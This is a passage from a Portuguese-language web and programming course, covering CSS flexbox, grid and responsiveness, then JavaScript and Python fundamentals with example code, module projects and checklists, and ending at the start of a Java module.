display: grid;          /* container em grade */
```

Diferença que confunde:

```css
visibility: hidden;   /* fica invisível mas o espaço continua lá */
display: none;        /* some e o espaço fecha */
opacity: 0;           /* transparente, mas ainda clicável */
```

### Aula 2.7 — Flexbox

Flexbox organiza elementos em **uma dimensão** — uma linha ou uma coluna. É a ferramenta que você mais vai usar.

```css
.container {
    display: flex;

    flex-direction: row;              /* row | column */
    justify-content: space-between;   /* alinha no eixo principal */
    align-items: center;              /* alinha no eixo cruzado */
    gap: 16px;                        /* espaço entre os filhos */
    flex-wrap: wrap;                  /* quebra linha se não couber */
}

.item {
    flex: 1;              /* cresce para ocupar o espaço livre */
    flex-shrink: 0;       /* não encolhe */
    flex-basis: 200px;    /* tamanho base */
}
```

**A ideia central:** flex tem um *eixo principal* e um *eixo cruzado*. Com `flex-direction: row`, o principal é horizontal — então `justify-content` mexe na horizontal e `align-items` na vertical. Se você trocar para `column`, os dois **invertem de papel**. Isso é o que quebra a cabeça de todo mundo.

Centralizar qualquer coisa, o santo graal:

```css
.centro {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}
```

### Aula 2.8 — Grid

Grid organiza em **duas dimensões** — linhas e colunas ao mesmo tempo. Use para o esqueleto da página; flex para os componentes dentro.

```css
.grade {
    display: grid;
    grid-template-columns: repeat(3, 1fr);   /* 3 colunas iguais */
    gap: 20px;
}

/* Layout clássico de página */
.pagina {
    display: grid;
    grid-template-areas:
        "cabecalho cabecalho"
        "lateral   conteudo"
        "rodape    rodape";
    grid-template-columns: 250px 1fr;
    min-height: 100vh;
}

header  { grid-area: cabecalho; }
aside   { grid-area: lateral; }
main    { grid-area: conteudo; }
footer  { grid-area: rodape; }
```

Grid responsivo sem media query — um truque que impressiona:

```css
.cards {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 20px;
}
```

Lê-se: "crie quantas colunas couberem, cada uma com no mínimo 250px, dividindo o resto igualmente". Em telas grandes vira 4 colunas, no celular vira 1. Sozinho.

### Aula 2.9 — Responsividade

**Mobile first.** Escreva o CSS para celular e vá adicionando o que muda em telas maiores. É mais fácil aumentar do que espremer.

```css
/* Base: celular */
.container { padding: 16px; }

/* Tablet para cima */
@media (min-width: 768px) {
    .container { padding: 32px; }
}

/* Desktop */
@media (min-width: 1024px) {
    .container {
        padding: 48px;
        max-width: 1200px;
        margin: 0 auto;
    }
}
```

Pontos de quebra comuns: 480px, 768px, 1024px, 1440px. Mas o certo é quebrar **onde o layout ficar feio**, não em números decorados. Vá arrastando a janela e veja onde quebra.

---

## Nível Avançado

### Aula 2.10 — Variáveis CSS

```css
:root {
    --cor-primaria: #2563eb;
    --cor-texto: #1f2937;
    --espaco: 1rem;
    --raio: 8px;
}

.botao {
    background: var(--cor-primaria);
    padding: var(--espaco);
    border-radius: var(--raio);
}
```

Muda o tema inteiro alterando quatro linhas. E permite tema escuro quase de graça:

```css
@media (prefers-color-scheme: dark) {
    :root {
        --cor-texto: #f9fafb;
    }
}
```

### Aula 2.11 — Posicionamento e empilhamento

```css
position: static;     /* padrão, segue o fluxo */
position: relative;   /* desloca a partir da posição original */
position: absolute;   /* sai do fluxo, ancora no ancestral posicionado */
position: fixed;      /* fixo na tela, não rola */
position: sticky;     /* rola até um ponto e trava */
```

Uso mais comum de `sticky` — cabeçalho que gruda no topo:

```css
header {
    position: sticky;
    top: 0;
    z-index: 100;
}
```

**Detalhe que quebra gente:** `position: absolute` se ancora no ancestral mais próximo que tenha `position` diferente de `static`. Se nenhum tiver, ele ancora no `<body>` e vai parar do outro lado da tela. Solução: coloque `position: relative` no pai que deve servir de referência.

### Aula 2.12 — Transições e animações

```css
.botao {
    background: blue;
    transition: background 0.3s ease, transform 0.2s ease;
}

.botao:hover {
    background: darkblue;
    transform: translateY(-2px);
}

/* Animação com keyframes */
@keyframes aparecer {
    from { opacity: 0; transform: translateY(20px); }
    to   { opacity: 1; transform: translateY(0); }
}

.card {
    animation: aparecer 0.5s ease forwards;
}
```

Anime só `transform` e `opacity` sempre que possível — essas duas o navegador processa na placa de vídeo e ficam suaves. Animar `width`, `height` ou `top` força o navegador a recalcular o layout e trava em celular fraco.

Respeite quem tem sensibilidade a movimento:

```css
@media (prefers-reduced-motion: reduce) {
    * { animation: none !important; transition: none !important; }
}
```

*(Este é o único lugar onde `!important` se justifica.)*

### Aula 2.13 — Organização de CSS

Sem método, seu CSS vira lixo a partir de 300 linhas. Aprenda **BEM**:

```css
/* Bloco */
.card { }

/* Elemento — parte do bloco, dois underlines */
.card__titulo { }
.card__imagem { }

/* Modificador — variação, dois traços */
.card--destaque { }
.card__titulo--grande { }
```

```html
<article class="card card--destaque">
    <img class="card__imagem" src="...">
    <h2 class="card__titulo">Título</h2>
</article>
```

Feio de ler, ótimo de manter: você olha a classe e sabe exatamente a que componente ela pertence, sem caçar no arquivo.

---

## Projeto do Módulo 2

**Landing page responsiva de um produto ou serviço.**

Requisitos:
- Cabeçalho fixo com menu que vira hambúrguer no celular (o botão pode não abrir ainda — abrir é JavaScript, próximo módulo)
- Seção hero com título, texto e botão de ação
- Grade de 3 a 6 cards de benefícios usando Grid
- Seção de depoimentos usando Flexbox
- Formulário de contato estilizado
- Rodapé com colunas
- Variáveis CSS para todas as cores
- Funcionando de 320px até 1920px sem barra de rolagem horizontal
- Nomenclatura BEM em todo o CSS

**Critério de aprovação:** abra o DevTools, ative o modo responsivo e passe por iPhone SE, iPad e Desktop. Nenhum elemento estourando, nenhum texto ilegível.

---

## Checklist de saída do Módulo 2

- [ ] Explico o box model e o que `border-box` muda
- [ ] Calculo especificidade de cabeça e sei por que minha regra perdeu
- [ ] Sei quando usar Flexbox e quando usar Grid
- [ ] Centralizo qualquer coisa vertical e horizontalmente sem pesquisar
- [ ] Escrevo media query mobile first
- [ ] Sei por que `position: absolute` às vezes foge do lugar
- [ ] Nunca usei `!important` no meu projeto

---

# MÓDULO 3 — JavaScript

> **Dificuldade:** ●●●○○ · **Tempo:** 12 a 16 semanas · **Pré-requisito:** Módulos 0, 1 e 2

**Objetivo:** programar de verdade. Fazer páginas reagirem, consumir dados de servidores e construir aplicações.

Este é **o módulo mais longo e mais importante do material** se o seu objetivo é emprego. Aqui tudo que você viu no Módulo 0 sai do papel. Não tenha pressa; passe o dobro do tempo aqui do que passou em qualquer outro módulo.

---

## Nível Básico

### Aula 3.1 — Variáveis e tipos

```javascript
let idade = 25;          // pode mudar depois
const nome = "Maria";    // não pode ser reatribuída
var antigo = "evite";    // sintaxe velha, tem armadilhas de escopo
```

**Regra prática:** use `const` por padrão. Só troque para `let` quando descobrir que precisa reatribuir. Nunca use `var`.

Tipos primitivos:

```javascript
let numero = 42;              // number (não existe int/float separado)
let texto = "Olá";            // string
let ligado = true;            // boolean
let vazio = null;             // ausência intencional de valor
let indefinido;               // undefined — nunca recebeu valor
let unico = Symbol("id");     // symbol
let gigante = 9007199254740993n;  // bigint
```

`null` vs `undefined`: `undefined` é "essa caixa nunca foi preenchida". `null` é "essa caixa foi esvaziada de propósito".

### Aula 3.2 — A armadilha da coerção de tipos

JavaScript converte tipos sozinho, e isso gera resultados absurdos:

```javascript
"5" + 3      // "53"   — vira texto
"5" - 3      // 2      — vira número
[] + {}      // "[object Object]"
0 == "0"     // true   — compara depois de converter
0 === "0"    // false  — compara tipo E valor
```

**Use sempre `===` e `!==`, nunca `==` e `!=`.** O `===` compara sem converter. Esta é uma das primeiras coisas que um entrevistador pergunta.

Valores "falsy" (que viram `false` numa condição) — decore os seis:

```javascript
false, 0, "", null, undefined, NaN
```

Todo o resto é `true`, inclusive `"0"`, `[]` e `{}`.

### Aula 3.3 — Estruturas de controle

```javascript
// Condicional
if (idade >= 18) {
    console.log("Maior");
} else if (idade >= 16) {
    console.log("Pode votar");
} else {
    console.log("Menor");
}

// Ternário — if compacto para atribuição
const status = idade >= 18 ? "adulto" : "menor";

// Switch
switch (dia) {
    case "sábado":
    case "domingo":
        console.log("Fim de semana");
        break;      // sem o break, ele continua nos casos seguintes
    default:
        console.log("Dia útil");
}

// Laços
for (let i = 0; i < 5; i++) { }

const frutas = ["maçã", "uva"];
for (const fruta of frutas) { }        // for...of: valores de array

const pessoa = { nome: "Ana", idade: 30 };
for (const chave in pessoa) { }        // for...in: chaves de objeto

while (condicao) { }
do { } while (condicao);               // executa ao menos uma vez
```

### Aula 3.4 — Funções

```javascript
// Declaração
function somar(a, b) {
    return a + b;
}

// Expressão
const somar2 = function(a, b) { return a + b; };

// Arrow function — a forma moderna
const somar3 = (a, b) => a + b;

// Com corpo
const saudar = (nome) => {
    const msg = `Olá, ${nome}!`;
    return msg;
};

// Parâmetro padrão
function saudar2(nome = "visitante") {
    return `Olá, ${nome}`;
}

// Rest: junta o resto num array
function somarTudo(...numeros) {
    return numeros.reduce((total, n) => total + n, 0);
}
somarTudo(1, 2, 3, 4);   // 10
```

**Template string** (as crases) merecem destaque:

```javascript
const nome = "Ana";
const idade = 30;

// Ruim
const msg1 = "Olá " + nome + ", você tem " + idade + " anos";

// Bom
const msg2 = `Olá ${nome}, você tem ${idade} anos`;

// Aceita várias linhas
const html = `
    <div>
        <h1>${nome}</h1>
    </div>
`;
```

---

## Nível Intermediário

### Aula 3.5 — Arrays e seus métodos

Se você dominar esta seção, você já escreve JavaScript melhor que muita gente empregada.

```javascript
const numeros = [1, 2, 3, 4, 5];
```

**Os que transformam (retornam array novo, não mexem no original):**

```javascript
// map — transforma cada item
const dobrados = numeros.map(n => n * 2);          // [2,4,6,8,10]

// filter — mantém só quem passa no teste
const pares = numeros.filter(n => n % 2 === 0);    // [2,4]

// reduce — reduz o array a um único valor
const soma = numeros.reduce((acc, n) => acc + n, 0);   // 15
```

O `reduce` assusta. Destrinchando: `acc` é o acumulador, `n` é o item atual, `0` é o valor inicial do acumulador.

| Volta | acc | n | acc + n |
|-------|-----|---|---------|
| 1 | 0 | 1 | 1 |
| 2 | 1 | 2 | 3 |
| 3 | 3 | 3 | 6 |
| 4 | 6 | 4 | 10 |
| 5 | 10 | 5 | 15 |

**Os que buscam:**

```javascript
numeros.find(n => n > 3);        // 4 — o primeiro que bate
numeros.findIndex(n => n > 3);   // 3 — a posição dele
numeros.includes(3);             // true
numeros.some(n => n > 4);        // true — algum bate?
numeros.every(n => n > 0);       // true — todos batem?
```

**Os que modificam o original (cuidado):**

```javascript
numeros.push(6);        // adiciona no fim
numeros.pop();          // remove do fim
numeros.shift();        // remove do início
numeros.unshift(0);     // adiciona no início
numeros.splice(1, 2);   // remove 2 itens a partir do índice 1
numeros.sort();         // ordena — cuidado, ordena como TEXTO por padrão
```

Armadilha do `sort`:

```javascript
[10, 9, 100].sort();                  // [10, 100, 9] — errado!
[10, 9, 100].sort((a, b) => a - b);   // [9, 10, 100] — certo
```

**Encadeamento** — onde a coisa fica elegante:

```javascript
const produtos = [
    { nome: "Camisa", preco: 50, estoque: 3 },
    { nome: "Calça", preco: 120, estoque: 0 },
    { nome: "Boné", preco: 30, estoque: 7 }
];

const totalDisponivel = produtos
    .filter(p => p.estoque > 0)
    .map(p => p.preco * p.estoque)
    .reduce((soma, valor) => soma + valor, 0);
```

Leia de cima para baixo: filtra os que têm estoque, calcula o valor de cada, soma tudo. Compare com fazer isso usando `for` — funciona igual, mas você lê a intenção direto.

### Aula 3.6 — Objetos

```javascript
const usuario = {
    nome: "Ana",
    idade: 30,
    endereco: {
        cidade: "Fortaleza",
        estado: "CE"
    },
    saudar() {
        return `Oi, sou ${this.nome}`;
    }
};

usuario.nome;                    // "Ana"
usuario["nome"];                 // igual, útil quando a chave é variável
usuario.endereco.cidade;         // "Fortaleza"
usuario.telefone?.numero;        // undefined em vez de erro (optional chaining)
```

**Desestruturação** — extrai propriedades em variáveis:

```javascript
const { nome, idade } = usuario;
const { cidade } = usuario.endereco;
const { telefone = "não informado" } = usuario;   // com valor padrão

// Funciona com arrays também
const [primeiro, segundo] = [10, 20];

// E em parâmetros de função
function mostrar({ nome, idade }) {
    console.log(`${nome}, ${idade}`);
}
mostrar(usuario);
```

**Spread** — espalha o conteúdo:

```javascript
const copia = { ...usuario };                    // cópia rasa
const atualizado = { ...usuario, idade: 31 };    // copia e sobrescreve
const juntos = [...array1, ...array2];           // concatena arrays
```

Isso é a base de como se trabalha com dados em React — nunca modificar, sempre criar um novo com a mudança.

### Aula 3.7 — DOM: fazendo a página reagir

Aqui o JavaScript encosta no HTML que você aprendeu.

```javascript
// Selecionar
const titulo = document.querySelector("h1");
const botoes = document.querySelectorAll(".btn");
const campo = document.getElementById("email");

// Modificar
titulo.textContent = "Novo título";        // texto puro, seguro
titulo.innerHTML = "<b>Negrito</b>";       // interpreta HTML — cuidado com XSS
titulo.style.color = "red";
titulo.classList.add("destaque");
titulo.classList.remove("oculto");
titulo.classList.toggle("aberto");         // liga/desliga

// Atributos
campo.value = "teste@email.com";
campo.setAttribute("disabled", "true");

// Criar e inserir
const novo = document.createElement("li");
novo.textContent = "Item novo";
document.querySelector("ul").appendChild(novo);

// Remover
novo.remove();
```

**Eventos:**

```javascript
botao.addEventListener("click", (evento) => {
    console.log("Clicou!");
});

formulario.addEventListener("submit", (e) => {
    e.preventDefault();     // impede o recarregamento da página
    const dados = new FormData(formulario);
    console.log(dados.get("email"));
});

campo.addEventListener("input", (e) => {
    console.log(e.target.value);   // dispara a cada tecla
});
```

**Delegação de eventos** — técnica que separa iniciante de intermediário:

```javascript
// Ruim: um listener por item. E itens criados depois não funcionam
document.querySelectorAll(".item").forEach(item => {
    item.addEventListener("click", fazerAlgo);
});

// Bom: um listener no pai, que pega os filhos atuais e futuros
document.querySelector(".lista").addEventListener("click", (e) => {
    if (e.target.matches(".item")) {
        fazerAlgo(e);
    }
});
```

Funciona porque o evento "borbulha" do elemento clicado para cima, passando pelos pais.

---

## Nível Avançado

### Aula 3.8 — Escopo, hoisting e closures

**Escopo** é onde uma variável existe:

```javascript
let global = "todo mundo vê";

function minhaFuncao() {
    let local = "só aqui dentro";
    if (true) {
        let bloco = "só neste bloco";      // let/const respeitam bloco
        var funcao = "vaza para a função";  // var ignora bloco
    }
    console.log(bloco);   // ERRO
    console.log(funcao);  // funciona — por isso var é ruim
}
```

**Closure** — uma função que "lembra" do ambiente onde foi criada:

```javascript
function criarContador() {
    let contagem = 0;              // vive fora da função interna

    return function() {
        contagem++;
        return contagem;
    };
}

const contar = criarContador();
contar();   // 1
contar();   // 2
contar();   // 3
```

A variável `contagem` deveria ter morrido quando `criarContador` terminou. Mas a função retornada mantém uma referência viva a ela. É assim que se cria estado privado em JavaScript, e é uma das perguntas de entrevista mais frequentes.

### Aula 3.9 — Assincronismo

JavaScript executa **uma coisa por vez** (é single-thread). Se uma operação demora — buscar dados de um servidor, ler um arquivo — a página inteira travaria. A solução é o código assíncrono.

**Promise** — uma promessa de valor futuro:

```javascript
const promessa = new Promise((resolve, reject) => {
    setTimeout(() => {
        const deuCerto = true;
        if (deuCerto) resolve("Sucesso!");
        else reject("Falhou");
    }, 1000);
});

promessa
    .then(resultado => console.log(resultado))
    .catch(erro => console.error(erro))
    .finally(() => console.log("Acabou, deu certo ou não"));
```

**async/await** — a mesma promessa, consumida de forma legível.

Repare que os dois blocos abaixo usam a `promessa` criada acima e imprimem o mesmo `"Sucesso!"`:

```javascript
// Com .then
promessa.then(resultado => console.log(resultado));

// Com async/await — mesma promessa, mesmo resultado
async function usar() {
    const resultado = await promessa;
    console.log(resultado);
}
```

O `await` desembrulha a promessa e devolve o valor de dentro dela. Some o `.then`, some o aninhamento, e o código volta a ser lido de cima para baixo.

Agora o mesmo recurso em algo real — buscar dados de um servidor:

```javascript
async function buscarUsuario(id) {
    try {
        const resposta = await fetch(`https://api.exemplo.com/users/${id}`);

        if (!resposta.ok) {
            throw new Error(`Erro HTTP: ${resposta.status}`);
        }

        const dados = await resposta.json();
        return dados;

    } catch (erro) {
        console.error("Falhou:", erro.message);
        return null;
    }
}

// Usando
const usuario = await buscarUsuario(1);
```

`await` pausa a função até a promessa resolver, sem travar o resto da página. Só funciona dentro de função `async`.

**Requisições em paralelo:**

```javascript
// Lento: espera uma terminar para começar a outra (2 segundos)
const a = await buscar1();
const b = await buscar2();

// Rápido: dispara as duas juntas (1 segundo)
const [a, b] = await Promise.all([buscar1(), buscar2()]);
```

### Aula 3.10 — Consumindo APIs

```javascript
async function carregarPosts() {
    const lista = document.querySelector("#posts");
    lista.innerHTML = "<li>Carregando...</li>";

    try {
        const resposta = await fetch("https://jsonplaceholder.typicode.com/posts");
        const posts = await resposta.json();

        lista.innerHTML = posts
            .slice(0, 10)
            .map(post => `<li><strong>${post.title}</strong></li>`)
            .join("");

    } catch (erro) {
        lista.innerHTML = "<li>Erro ao carregar. Tente novamente.</li>";
    }
}
```

`https://jsonplaceholder.typicode.com` é uma API pública gratuita feita para treino. Use bastante.

**POST com corpo:**

```javascript
const resposta = await fetch("https://api.exemplo.com/posts", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ titulo: "Meu post", texto: "Conteúdo" })
});
```

### Aula 3.11 — Classes e orientação a objetos

```javascript
class Animal {
    #segredo = "privado";      // campo privado de verdade

    constructor(nome, idade) {
        this.nome = nome;
        this.idade = idade;
    }

    fazerSom() {
        return "Som genérico";
    }

    get descricao() {
        return `${this.nome}, ${this.idade} anos`;
    }

    static criarFilhote(nome) {     // método da classe, não da instância
        return new Animal(nome, 0);
    }
}

class Cachorro extends Animal {
    constructor(nome, idade, raca) {
        super(nome, idade);      // chama o construtor do pai
        this.raca = raca;
    }

    fazerSom() {                 // sobrescreve o método do pai
        return "Au au!";
    }
}

const rex = new Cachorro("Rex", 3, "Labrador");
rex.fazerSom();      // "Au au!"
rex.descricao;       // "Rex, 3 anos"
```

Você vai ver isso de novo no C++, com a mesma lógica e sintaxe diferente.

### Aula 3.12 — Módulos e ferramentas

```javascript
// arquivo: matematica.js
export function somar(a, b) { return a + b; }
export const PI = 3.14159;
export default class Calculadora { }

// arquivo: main.js
import Calculadora, { somar, PI } from './matematica.js';
```

No HTML: `<script type="module" src="main.js"></script>`

**Armazenamento no navegador:**

```javascript
localStorage.setItem("tema", "escuro");        // persiste após fechar
const tema = localStorage.getItem("tema");
localStorage.removeItem("tema");

// Guardando objetos: precisa converter para texto
localStorage.setItem("usuario", JSON.stringify({ nome: "Ana" }));
const usuario = JSON.parse(localStorage.getItem("usuario"));
```

**Depois de dominar o JS puro** (e só depois), o próximo passo natural é: Git + GitHub → Node.js e npm → um framework (React é o mais pedido em vaga no Brasil). Mas não pule para React sem ter feito os projetos abaixo em JavaScript puro. Framework em cima de base fraca produz gente que sabe React e não sabe programar — e isso aparece na entrevista técnica.

---

## Projetos do Módulo 3

Faça os três. Eles são o núcleo do seu portfólio.

**Projeto 1 — Lista de tarefas (fundamentos + DOM)**
Adicionar, marcar como concluída, remover, filtrar por status, salvar no localStorage. Sem framework.

**Projeto 2 — Consumidor de API (assincronismo)**
Escolha uma API pública (clima, filmes, CEP, Pokémon). Campo de busca, tela de carregamento, tratamento de erro, exibição em cards. Este é o projeto que mais impressiona recrutador júnior.

**Projeto 3 — Aplicação com estado (integração)**
Carrinho de compras ou controle financeiro pessoal. Adicionar itens, calcular totais, editar, remover, persistir, filtrar por categoria, mostrar um resumo.

---

## Checklist de saída do Módulo 3

- [ ] Sei por que usar `===` em vez de `==` e listo os 6 valores falsy
- [ ] Escrevo `map`, `filter` e `reduce` sem consultar
- [ ] Explico closure com um exemplo próprio
- [ ] Consumo uma API com async/await tratando erro
- [ ] Uso delegação de eventos e sei por que ela funciona
- [ ] Sei a diferença entre `let`, `const` e `var`
- [ ] Meus 3 projetos estão no GitHub com README

---

# MÓDULO 4 — Python

> **Dificuldade:** ●●●○○ · **Tempo:** 10 a 12 semanas · **Pré-requisito:** Módulo 3 (ou Módulo 0, se preferir inverter)

**Objetivo:** aprofundar lógica e algoritmos numa linguagem de sintaxe limpa, e abrir as portas de back-end, automação e dados.

Python tira quase toda a cerimônia da sintaxe. Sem chaves, sem ponto e vírgula, sem declaração de tipo. O que sobra é o raciocínio — por isso ele é a melhor linguagem para estudar **algoritmos** de verdade.

---

## Nível Básico

### Aula 4.1 — Sintaxe e indentação

```python
nome = "Maria"
idade = 30
altura = 1.65
estudante = True

print(f"{nome} tem {idade} anos")     # f-string, igual à template string do JS
```

**A indentação não é estilo, é sintaxe.** O que em JavaScript são chaves, em Python é o recuo:

```python
if idade >= 18:
    print("Maior de idade")      # 4 espaços definem que está dentro do if
    print("Pode dirigir")
print("Fora do if")              # sem recuo, está fora
```

Errar o recuo é erro de programa, não de estilo. Configure seu editor para usar 4 espaços (não Tab).

### Aula 4.2 — Tipos e conversão

```python
type(42)          # <class 'int'>
type(3.14)        # <class 'float'>
type("texto")     # <class 'str'>
type(True)        # <class 'bool'>

int("42")         # 42
float("3.14")     # 3.14
str(42)           # "42"

idade = int(input("Sua idade: "))   # input SEMPRE retorna texto
```

Esquecer o `int()` no `input()` é o erro número um de quem começa em Python.

### Aula 4.3 — Operadores e controle

```python
7 / 2      # 3.5   divisão normal
7 // 2     # 3     divisão inteira (descarta a fração)
7 % 2      # 1     resto
2 ** 10    # 1024  potência

# Lógicos escritos por extenso
if idade >= 18 and tem_carteira:
    print("Pode dirigir")
elif idade >= 16 or autorizado:
    print("Caso especial")
else:
    print("Não pode")

# Encadeamento que só Python tem
if 0 <= nota <= 10:
    print("Nota válida")
```

```python
# Laços
for i in range(5):           # 0,1,2,3,4
    print(i)

for i in range(1, 11):       # 1 até 10
    print(i)

for i in range(0, 21, 2):    # de 2 em 2
    print(i)

for fruta in ["maçã", "uva"]:
    print(fruta)

for indice, fruta in enumerate(["maçã", "uva"]):
    print(f"{indice}: {fruta}")

while resposta != "sair":
    resposta = input("Digite: ")
```

`break` sai do laço, `continue` pula para a próxima volta.

### Aula 4.4 — Estruturas de dados

Python tem quatro coleções e saber escolher entre elas é metade do trabalho.

```python
# LISTA — ordenada, mutável, aceita repetidos
notas = [7.5, 8.0, 6.5]
notas.append(9.0)
notas[0]           # 7.5
notas[-1]          # 9.0  — índice negativo conta de trás
notas[1:3]         # [8.0, 6.5]  — fatiamento

# TUPLA — ordenada, IMUTÁVEL
coordenada = (10, 20)
# coordenada[0] = 5   → ERRO

# DICIONÁRIO — pares chave:valor
pessoa = {"nome": "Ana", "idade": 30}
pessoa["nome"]              # "Ana"
pessoa.get("email", "n/a")  # valor padrão se a chave não existir
pessoa["email"] = "a@b.com" # adiciona
for chave, valor in pessoa.items():
    print(f"{chave}: {valor}")

# CONJUNTO — sem ordem, sem repetidos
numeros = {1, 2, 3, 3, 3}   # vira {1, 2, 3}
```

Truque prático: remover duplicados de uma lista em uma linha.

```python
lista_limpa = list(set([1, 2, 2, 3, 3, 3]))   # [1, 2, 3]
```

### Aula 4.5 — Funções

```python
def calcular_media(notas):
    """Calcula a média de uma lista de notas."""     # docstring
    if not notas:
        return 0
    return sum(notas) / len(notas)


def saudar(nome, saudacao="Olá"):        # parâmetro com padrão
    return f"{saudacao}, {nome}!"

saudar("Ana")                            # "Olá, Ana!"
saudar("Ana", saudacao="Bom dia")        # argumento nomeado


def somar_tudo(*numeros):                # aceita quantidade variável
    return sum(numeros)

def config(**opcoes):                    # aceita nomeados variáveis
    print(opcoes)                        # vira um dicionário
```

---

## Nível Intermediário

### Aula 4.6 — Compreensões de lista

O recurso mais característico de Python. Substitui laços inteiros:

```python
# Comum
quadrados = []
for n in range(10):
    quadrados.append(n ** 2)

# Compreensão — mesma coisa
quadrados = [n ** 2 for n in range(10)]

# Com filtro
pares = [n for n in range(20) if n % 2 == 0]

# Transformando dados
nomes = [p["nome"].upper() for p in pessoas if p["idade"] >= 18]

# Também funciona para dicionário e conjunto
quadrados_dict = {n: n**2 for n in range(5)}
```

Use quando for uma transformação simples. Se você precisar de duas condições e um `else` aninhado, volte para o `for` normal — legibilidade vence esperteza.

### Aula 4.7 — Manipulação de texto

```python
texto = "  Olá, Mundo!  "

texto.strip()               # tira espaços das pontas
texto.lower()               # minúsculas
texto.upper()               # maiúsculas
texto.replace("Mundo", "Brasil")
texto.split(",")            # divide em lista
",".join(["a", "b", "c"])   # junta lista em texto: "a,b,c"
texto.startswith("Olá")
"Mundo" in texto            # True
len(texto)
```

### Aula 4.8 — Arquivos

```python
# Ler
with open("dados.txt", "r", encoding="utf-8") as arquivo:
    conteudo = arquivo.read()

with open("dados.txt", "r", encoding="utf-8") as arquivo:
    for linha in arquivo:
        print(linha.strip())

# Escrever ("w" apaga tudo, "a" acrescenta ao fim)
with open("saida.txt", "w", encoding="utf-8") as arquivo:
    arquivo.write("Primeira linha\n")

# CSV
import csv
with open("dados.csv", newline="", encoding="utf-8") as f:
    leitor = csv.DictReader(f)
    for linha in leitor:
        print(linha["nome"])

# JSON
import json
with open("dados.json", encoding="utf-8") as f:
    dados = json.load(f)
```

O `with` fecha o arquivo automaticamente, mesmo se der erro no meio. Sempre use `with`.

### Aula 4.9 — Erros e exceções

```python
try:
    numero = int(input("Digite um número: "))
    resultado = 10 / numero

except ValueError:
    print("Isso não é um número.")

except ZeroDivisionError:
    print("Não dá para dividir por zero.")

except Exception as erro:
    print(f"Erro inesperado: {erro}")

else:
    print(f"Deu certo: {resultado}")     # roda se não houve erro

finally:
    print("Sempre executa")
```

Capture exceções **específicas**. Um `except Exception` genérico esconde bugs e você fica horas caçando um problema que o Python teria te contado.

### Aula 4.10 — Classes

```python
class ContaBancaria:
    taxa_juros = 0.01          # atributo de classe, compartilhado

    def __init__(self, titular, saldo=0):
        self.titular = titular
        self.saldo = saldo
        self._historico = []           # _ sinaliza "uso interno"

    def depositar(self, valor):
        if valor <= 0:
            raise ValueError("Valor deve ser positivo")
        self.saldo += valor
        self._historico.append(f"Depósito: {valor}")

    def sacar(self, valor):
        if valor > self.saldo:
            raise ValueError("Saldo insuficiente")
        self.saldo -= valor

    def __str__(self):                 # como o objeto vira texto no print
        return f"Conta de {self.titular}: R$ {self.saldo:.2f}"


class ContaPoupanca(ContaBancaria):
    def render_juros(self):
        self.saldo *= (1 + self.taxa_juros)


conta = ContaPoupanca("Ana", 1000)
conta.depositar(500)
print(conta)         # Conta de Ana: R$ 1500.00
```

---

## Nível Avançado

### Aula 4.11 — Módulos e ambiente virtual

```bash
python -m venv venv          # cria ambiente isolado
source venv/bin/activate     # ativa (Linux/Mac)
venv\Scripts\activate        # ativa (Windows)
pip install requests
pip freeze > requirements.txt
```

**Sempre crie um ambiente virtual por projeto.** Sem isso, as bibliotecas de projetos diferentes brigam entre si e você perde um fim de semana.

Bibliotecas padrão úteis:

```python
import os, sys, math, random, datetime, re, json, collections
from pathlib import Path

random.randint(1, 100)
datetime.datetime.now().strftime("%d/%m/%Y")
re.findall(r"\d+", "abc123def456")      # ['123', '456']
```

### Aula 4.12 — Recursos avançados

```python
# Decorador — envolve uma função para adicionar comportamento
import time

def cronometrar(funcao):
    def wrapper(*args, **kwargs):
        inicio = time.time()
        resultado = funcao(*args, **kwargs)
        print(f"Levou {time.time() - inicio:.2f}s")
        return resultado
    return wrapper

@cronometrar
def tarefa_lenta():
    time.sleep(2)

# Gerador — produz valores sob demanda, sem carregar tudo na memória
def numeros_infinitos():
    n = 0
    while True:
        yield n
        n += 1

# lambda — função anônima curta
dobrar = lambda x: x * 2
pessoas.sort(key=lambda p: p["idade"])
```

Decoradores usam closures — o mesmo conceito que você viu em JavaScript. As linguagens conversam mais do que parece.

### Aula 4.13 — Para onde Python leva

Depois da base, escolha **uma** trilha, não três:

| Trilha | Bibliotecas | Para quem quer |
|--------|-------------|----------------|
| Automação | `openpyxl`, `selenium`, `schedule` | Resolver problema de trabalho |
| Web / Back-end | Flask, Django, FastAPI | Vaga de back-end |
| Dados | pandas, numpy, matplotlib | Análise, BI |
| Web scraping | requests, BeautifulSoup | Coleta de dados |

Se o objetivo é emprego somado ao que você já tem de front-end, **FastAPI ou Flask** é a escolha que te transforma em desenvolvedor full-stack — o perfil mais contratado em empresa pequena e média.

---

## Projetos do Módulo 4

**Projeto 1 — CLI de gerenciamento**
Sistema de cadastro (produtos, contatos, o que quiser) rodando no terminal. Menu, criar/listar/editar/excluir, persistência em JSON, tratamento de erro em toda entrada do usuário.

**Projeto 2 — Automação real**
Um script que resolve um problema que você tem de verdade. Ler várias planilhas e gerar um relatório consolidado, renomear arquivos em lote, extrair dados de um site. O critério é: você usar de novo depois de pronto.

**Projeto 3 — API REST**
Com FastAPI ou Flask: endpoints de CRUD, banco SQLite, documentação automática. Depois **conecte o front-end do Módulo 3 nessa API**. Quando essas duas peças conversarem, você é full-stack.

---

## Checklist de saída do Módulo 4

- [ ] Sei quando usar lista, tupla, dicionário e conjunto
- [ ] Escrevo compreensão de lista com filtro
- [ ] Leio e escrevo arquivos usando `with`
- [ ] Capturo exceções específicas, não genéricas
- [ ] Crio classe com herança e `__init__`
- [ ] Uso ambiente virtual em todo projeto
- [ ] Tenho uma API que meu front-end do Módulo 3 consome

---

# MÓDULO 5 — Java

> **Dificuldade:** ●●●○○ · **Tempo:** 10 a 12 semanas · **Pré-requisito:** Módulos 0, 3 e 4

**Objetivo:** escrever software orientado a objetos com tipagem estática, e entrar no mercado corporativo — que no Brasil é onde está a maior parte das vagas de back-end.

Java parece Python com burocracia. Nas primeiras semanas você vai reclamar de escrever cinco linhas para fazer o que o Python fazia em uma. Depois de um mês, quando um programa seu passar de dois mil linhas, você vai entender para que serve a burocracia: o compilador pega hoje o erro que o Python só te mostraria em produção, na terça-feira, às três da manhã.

